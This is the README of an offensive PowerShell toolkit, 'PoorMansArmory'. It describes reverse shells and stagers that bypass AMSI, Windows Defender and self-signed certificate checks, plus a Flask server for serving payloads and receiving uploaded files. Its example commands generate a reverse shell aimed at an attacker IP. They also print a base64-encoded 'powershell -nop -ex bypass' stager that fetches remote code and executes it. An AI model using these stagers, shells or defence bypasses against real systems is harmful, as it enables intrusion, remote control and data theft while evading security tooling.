# PoorMansArmory
Collection of malleable payloads and tools that aim to bypass AMSI, Windows Defender, and self-signed certificate checks while being intuitive to use.

```
                            _ _
 ____  __  __      _       | | | 
|  _ \|  \/  |    / \      | | |
| |_) | |\/| |   / _ \     | | |  BALLIN ON A BUDGET
|  __/| |  | |_ / ___ \ _  | | |
|_| (_)_|  |_(_)_/   \_(_) | | |
                           |_|_|
```

### Reverse Shells & Stagers
- Supports both PowerShell Desktop and PowerShell Core
- Payloads default to PowerShell 5.0, but can be toggled to PowerShell 2.0
- Works in both a Linux and Windows environment

Below example creates a reverse shell that has disables AMSI and loads in the WebClient Helper scripts, outputs the revshell into the "pma_server.py" downloads directory, and creates a stager pointing to the payload.
```powershell
# pwsh
PS /opt/PoorMansArmory> Get-RevShell <attacker_ip> <listening_port> -AmsiBypass -WebClientURL "http(s)://<ip_addr>" -Base64 > ./downloads/revshell
PS /opt/PoorMansArmory> Get-Stager -PayloadURL "http(s)://<ip_addr>/d/revshell" -Base64
powershell -nop -ex bypass -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AF0AKQAuAEQAbw
B3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAAoAHMAKQA6AC8ALwA8AGkAcABfAGEAZABkAHIAPgAvAGQALwBOAG8AdABBAFIAZQB2AFMAaABlAGwAbAAnACkAKQA=
```

### pma_server.py
- Simple Flask server
- Supports SSL via self-signed certificates
- ``/d/`` directory is for downloadable files
- ``/u/`` directory is for uploaded files

![pma_server](https://cdn.discordapp.com/attachments/855920119292362802/1110739921028792351/image.png)

### WebClient Helper Tools
Functions Include:
- "download"
- "upload"
- "import"

Below example uses the WebClient helper tools with both an AMSI bypass and HTTPS bypass.  Functionality shows off uploads, as well as importing PowerShell scripts into session, as well as reflecting C# binaries.

![WebClient Helpers](https://cdn.discordapp.com/attachments/855920119292362802/1110744324158799932/image.png)
)
